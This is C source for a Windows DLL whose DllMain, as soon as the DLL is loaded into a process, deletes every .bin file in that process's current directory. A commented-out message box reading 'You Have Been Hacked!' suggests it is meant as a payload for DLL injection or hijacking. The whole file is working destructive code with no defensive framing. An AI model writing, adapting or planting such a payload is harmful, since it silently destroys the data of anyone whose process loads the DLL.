#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:{
        //MessageBoxA(NULL, "You Have Been Hacked!", "Hacked Window", MB_OK);

        char current_directory[MAX_PATH];

        if (GetCurrentDirectoryA(sizeof(current_directory), current_directory) == 0) {
            printf("Error getting current directory: %lu\n", GetLastError());
            return 1;
        }

        char search_mask[MAX_PATH];
        snprintf(search_mask, sizeof(search_mask), "%s\\*.bin", current_directory);

        WIN32_FIND_DATA findFileData;
        HANDLE hFind = FindFirstFile(search_mask, &findFileData);

        if (hFind == INVALID_HANDLE_VALUE) {
            return 1;
        }

        do {
            // Проверяем, что это не каталог
            if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                char file_path[MAX_PATH];
                snprintf(file_path, sizeof(file_path), "%s\\%s", current_directory, findFileData.cFileName);

                DeleteFile(file_path);
            }
        } while (FindNextFile(hFind, &findFileData) != 0);

        FindClose(hFind);

        break;
    }
    
        
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}